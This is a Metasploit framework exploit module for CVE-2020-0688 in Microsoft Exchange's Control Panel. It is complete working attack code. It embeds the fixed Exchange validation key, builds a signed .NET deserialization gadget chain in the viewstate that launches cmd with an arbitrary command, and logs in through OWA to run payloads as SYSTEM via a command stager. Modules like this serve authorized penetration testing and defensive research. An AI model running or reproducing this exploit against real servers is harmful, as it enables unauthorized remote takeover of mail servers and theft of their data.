##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'bindata'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  # include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager

  DEFAULT_VIEWSTATE_GENERATOR = 'B97B4E27'
  VALIDATION_KEY = "\xcb\x27\x21\xab\xda\xf8\xe9\xdc\x51\x6d\x62\x1d\x8b\x8b\xf1\x3a\x2c\x9e\x86\x89\xa2\x53\x03\xbf"

  def initialize(info = {})
    super(update_info(info,
        'Name'           => 'Exchange Control Panel Viewstate Deserialization',
        'Description'    => %q{
          This module exploits a .NET serialization vulnerability in the
          Exchange Control Panel (ECP) web page. The vulnerability is due to
          Microsoft Exchange Server not randomizing the keys on a
          per-installation basis resulting in them using the same validationKey
          and decryptionKey values. With knowledge of these, values an attacker
          can craft a special viewstate to cause an OS command to be executed
          by NT_AUTHORITY\SYSTEM using .NET deserialization.
        },
        'Author'         => 'Spencer McIntyre',
        'License'        => MSF_LICENSE,
        'References'     => [
            ['CVE', '2020-0688'],
            ['URL', 'https://www.thezdi.com/blog/2020/2/24/cve-2020-0688-remote-code-execution-on-microsoft-exchange-server-through-fixed-cryptographic-keys'],
        ],
        'Platform'       => 'win',
        'Targets'        =>
          [
            [ 'Windows (x86)', { 'Arch' => ARCH_X86 } ],
            [ 'Windows (x64)', { 'Arch' => ARCH_X64 } ],
            [ 'Windows (cmd)', { 'Arch' => ARCH_CMD, 'Space' => 400 } ]
          ],
        'DefaultOptions' =>
          {
            'SSL' => true
          },
        'DefaultTarget'  => 0,
        'DisclosureDate' => 'Feb 11 2020',
        'Notes'          =>
          {
            'Stability'   => [ CRASH_SAFE, ],
            'SideEffects' => [ ARTIFACTS_ON_DISK, IOC_IN_LOGS, ],
            'Reliability' => [ REPEATABLE_SESSION, ],
          }
        ))

    register_options([
      Opt::RPORT(443),
      OptString.new('USERNAME', [ true, 'Username to authenticate as', '' ]),
      OptString.new('PASSWORD', [ true, 'The password to authenticate with' ])
    ])

    register_advanced_options([
      OptFloat.new('CMDSTAGER::DELAY', [ true, 'The CMD Stager to use.', 0.5 ]),
    ])
  end

  #
  # .NET Serialization types
  #
  RecordTypeEnum = {
    # see: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrbf/954a0657-b901-4813-9398-4ec732fe8b32
    :SerializedStreamHeader => 0,
    :ClassWithId => 1,
    :SystemClassWithMembers => 2,
    :ClassWithMembers => 3,
    :SystemClassWithMembersAndTypes => 4,
    :ClassWithMembersAndTypes => 5,
    :BinaryObjectString => 6,
    :BinaryArray => 7,
    :MemberPrimitiveTyped => 8,
    :MemberReference => 9,
    :ObjectNull => 10,
    :MessageEnd => 11,
    :BinaryLibrary => 12,
    :ObjectNullMultiple256 => 13,
    :ObjectNullMultiple => 14,
    :ArraySinglePrimitive => 15,
    :ArraySingleObject => 16,
    :ArraySingleString => 17,
    :MethodCall => 21,
    :MethodReturn => 22
  }

  BinaryTypeEnum = {
    # see: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrbf/054e5c58-be21-4c86-b1c3-f6d3ce17ec72
    :Primitive => 0,
    :String => 1,
    :Object => 2,
    :SystemClass => 3,
    :Class => 4,
    :ObjectArray => 5,
    :StringArray => 6,
    :PrimitiveArray => 7
  }

  class LengthPrefixedString < BinData::BasePrimitive
    # see: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrbf/10b218f5-9b2b-4947-b4b7-07725a2c8127
    def assign(val)
      super(binary_string(val))
    end

    private

    def value_to_binary_string(string)
      prefix = []
      length = string.length
      while length > 0
        value = length & 0x7f
        length >>= 7
        value |= 0x80 if length > 0
        prefix << value
      end
      return prefix.pack('C*') + string
    end

    def read_and_return_value(io)
      length = 0
      loop do
        ch = io.readbytes(1).unpack('C')[0]
        length += ch & 0x7f
        break if (ch & 0x80) == 0
      end

      io.readbytes(length)
    end

    def sensible_default
      ""
    end
  end

  class BinaryLibrary < BinData::Record
    endian                 :little
    hide                   :record_type
    uint8                  :record_type, :asserted_value => RecordTypeEnum[:BinaryLibrary]
    int32                  :library_id
    length_prefixed_string :library_name
  end

  class BinaryObjectString < BinData::Record
    endian                 :little
    hide                   :record_type
    uint8                  :record_type, :asserted_value => RecordTypeEnum[:BinaryObjectString]
    int32                  :obj_id
    length_prefixed_string :string
  end

  class ClassInfo < BinData::Record
    # see: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrbf/0a192be0-58a1-41d0-8a54-9c91db0ab7bf
    endian                 :little
    int32                  :obj_id
    length_prefixed_string :name
    int32                  :member_count, :value => lambda { member_names.length }
    array                  :member_names, :type => :length_prefixed_string, :read_until => lambda { index == member_count - 1 }
  end

  class MemberTypeInfo < BinData::Record
    endian                 :little
    # see: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrbf/aa509b5a-620a-4592-a5d8-7e9613e0a03e
    array                  :binary_type_enums, :type => :uint8
    #??? : member_type_info # this field is not supported, it's only used if binary_type_enums contains
    # Primitive, SystemClass, Class, or PrimitiveArray
    virtual                :valid, :assert => lambda {
      (!binary_type_enums.include? BinaryTypeEnum[:Primitive]) \
        && (!binary_type_enums.include? BinaryTypeEnum[:SystemClass]) \
        && (!binary_type_enums.include? BinaryTypeEnum[:Class]) \
        && (!binary_type_enums.include? BinaryTypeEnum[:PrimitiveArray])
    }
    virtual :assert => lambda { valid.assert! }
  end

  class ClassWithMembersAndTypes < BinData::Record
    # see: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrbf/847b0b6a-86af-4203-8ed0-f84345f845b9
    endian                 :little
    hide                   :record_type
    uint8                  :record_type, :asserted_value => RecordTypeEnum[:ClassWithMembersAndTypes]
    class_info             :class_info
    member_type_info       :member_type_info
    int32                  :library_id
    virtual                :valid, :assert => lambda {
      member_type_info.valid.assert!
    }
    virtual :assert => lambda { valid.assert! }
  end

  class SerializationHeaderRecord < BinData::Record
    # see: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrbf/a7e578d3-400a-4249-9424-7529d10d1b3c
    endian                 :little
    default_parameter      major_version: 1
    default_parameter      minor_version: 0
    hide                   :record_type
    uint8                  :record_type, :asserted_value => RecordTypeEnum[:SerializedStreamHeader]
    int32                  :header_id
    int32                  :major_version, :initial_value => :major_version
    int32                  :minor_version, :initial_value => :minor_version
  end

  class ObjectStateFormatter < BinData::Record
    # see: https://github.com/microsoft/referencesource/blob/3b1eaf5203992df69de44c783a3eda37d3d4cd10/System.Web/UI/ObjectStateFormatter.cs
    endian                 :little
    default_parameter      marker_format: 0xff
    default_parameter      marker_version: 1
    hide                   :marker_format,  :marker_version
    uint8                  :marker_format,  :initial_value => :marker_format
    uint8                  :marker_version, :initial_value => :marker_version
    uint8                  :token
  end

  def check
    return Exploit::CheckCode::Unsupported
  end

  def encode_7bit_int(int)
    # see: https://github.com/microsoft/referencesource/blob/3b1eaf5203992df69de44c783a3eda37d3d4cd10/mscorlib/system/io/binaryreader.cs#L582
    encoded_int = []
    while int > 0
      value = int & 0x7f
      int >>= 7
      value |= 0x80 if int > 0
      encoded_int << value
    end
    return encoded_int.pack('C*')
  end

  def generate_viewstate(generator, session_id, cmd)
    # LosFormatted
    resource_dictionary  = "<ResourceDictionary "
    resource_dictionary <<   "xmlns=\"http://schemas.microsoft.com/winfx/2006/xaml/presentation\" "
    resource_dictionary <<   "xmlns:x=\"http://schemas.microsoft.com/winfx/2006/xaml\" "
    resource_dictionary <<   "xmlns:System=\"clr-namespace:System;assembly=mscorlib\" "
    resource_dictionary <<   "xmlns:Diag=\"clr-namespace:System.Diagnostics;assembly=system\">"
    resource_dictionary <<     "<ObjectDataProvider x:Key=\"\" ObjectType=\"{x:Type Diag:Process}\" MethodName=\"Start\">"
    resource_dictionary <<       "<ObjectDataProvider.MethodParameters>"
    resource_dictionary <<         "<System:String>cmd</System:String>"
    resource_dictionary <<         "<System:String>/c #{cmd.encode(:xml => :text)}</System:String>"
    resource_dictionary <<       "</ObjectDataProvider.MethodParameters>"
    resource_dictionary <<     "</ObjectDataProvider>"
    resource_dictionary << "</ResourceDictionary>"

    library = BinaryLibrary.new(
      library_id: 2,
      library_name: "Microsoft.PowerShell.Editor, Version=3.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35"
    )

    serialized  = "\x00\x01\x00\x00"
    serialized << SerializationHeaderRecord.new(header_id: -1).to_binary_s
    serialized << library.to_binary_s
    serialized << ClassWithMembersAndTypes.new(
      class_info: ClassInfo.new(
        obj_id: 1,
        name: 'Microsoft.VisualStudio.Text.Formatting.TextFormattingRunProperties',
        member_names: ['ForegroundBrush']
      ),
      member_type_info: MemberTypeInfo.new(
        binary_type_enums: [BinaryTypeEnum[:String]]
      ),
      library_id: library.library_id
    ).to_binary_s
    serialized << BinaryObjectString.new(
      obj_id: 3,
      string: resource_dictionary
    ).to_binary_s
    serialized << "\x0b"

    # token: Token_BinarySerialized
    formatted  = ObjectStateFormatter.new(token: 50).to_binary_s
    formatted << encode_7bit_int(serialized.length)
    formatted << serialized

    mac_key_bytes  = Rex::Text.hex_to_raw(generator).unpack('I<').pack('I>')
    mac_key_bytes << Rex::Text.to_unicode(session_id)

    signature = OpenSSL::HMAC.digest(OpenSSL::Digest.new('sha1'), VALIDATION_KEY, formatted + mac_key_bytes)
    return Rex::Text.encode_base64(formatted + signature)
  end

  def exploit
    # need to use a newer default useragent than what Metasploit currently provides
    # see: https://docs.microsoft.com/en-us/microsoft-edge/web-platform/user-agent-string
    user_agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.74 Safari/537.36 Edg/79.0.309.43'
    res = send_request_cgi({
        'uri'           => normalize_uri(target_uri.path, 'owa', 'auth.owa'),
        'method'        => 'POST',
        'content-type'  => 'application/x-www-form-urlencoded',
        'agent'         => user_agent,
        'vars_post'     => {
          'password'    => datastore['PASSWORD'],
          'flags'       => '4',
          'destination' => "#{datastore['SSL'] ? 'https' : 'http'}://#{datastore['RHOST']}/#{normalize_uri(target_uri.path, 'owa')}",
          'username'    => datastore['USERNAME']
        }
    })
    cookies = [res.get_cookies]

    res = send_request_cgi({
      'uri'    => normalize_uri(target_uri.path, 'ecp', 'default.aspx'),
      'cookie' => res.get_cookies,
      'agent'  => user_agent
    })
    fail_with(Failure::UnexpectedReply, 'Failed to get the __VIEWSTATEGENERATOR page') unless res.code == 200
    cookies << res.get_cookies

    viewstate_generator = res.body.scan(/id="__VIEWSTATEGENERATOR"\s+value="([a-fA-F0-9]{8})"/).flatten[0]
    if viewstate_generator.nil?
      print_warning("Failed to find the __VIEWSTATEGENERATOR, using the default value: #{DEFAULT_VIEWSTATE_GENERATOR}")
      viewstate_generator = DEFAULT_VIEWSTATE_GENERATOR
    else
      vprint_status("Recovered the __VIEWSTATEGENERATOR: #{viewstate_generator}")
    end

    session_id = res.get_cookies.scan(/ASP\.NET_SessionId=([\w\-]+);/).flatten[0]
    if session_id.nil?
      fail_with(Failure::UnexpectedReply, 'Failed to get the ASP.NET_SessionId from the response cookies')
    end
    vprint_status("Recovered the ASP.NET_SessionID: #{session_id}")

    state = {
      user_agent: user_agent,
      cookies: cookies,
      viewstate_generator: viewstate_generator,
      session_id: session_id,
    }

    # the major limit is the max length of a GET request, the command will be
    # XML escaped and then base64 encoded which both increase the size
    if target.arch.first == ARCH_CMD
      execute_command(payload.encoded, opts={state: state})
    else
      execute_cmdstager({linemax: 450, delay: datastore['CMDSTAGER::DELAY'], state: state})
    end
  end

  def execute_command(cmd, opts)
    state = opts[:state]
    viewstate = generate_viewstate(state[:viewstate_generator], state[:session_id], cmd)
    5.times do |iteration|
      # this request *must* be a GET request, can't use POST to use a larger viewstate
      send_request_cgi({
        'uri'      => normalize_uri(target_uri.path, 'ecp', 'default.aspx'),
        'cookie'   => state[:cookies].join(''),
        'agent'    => state[:user_agent],
        'vars_get' => {
          '__VIEWSTATE'          => viewstate,
          '__VIEWSTATEGENERATOR' => state[:viewstate_generator]
        }
      })
      break
    rescue Rex::ConnectionError, Errno::ECONNRESET => e
      vprint_warning('Encountered a connection error while sending the command, sleeping before retrying')
      sleep iteration
    end
  end
end
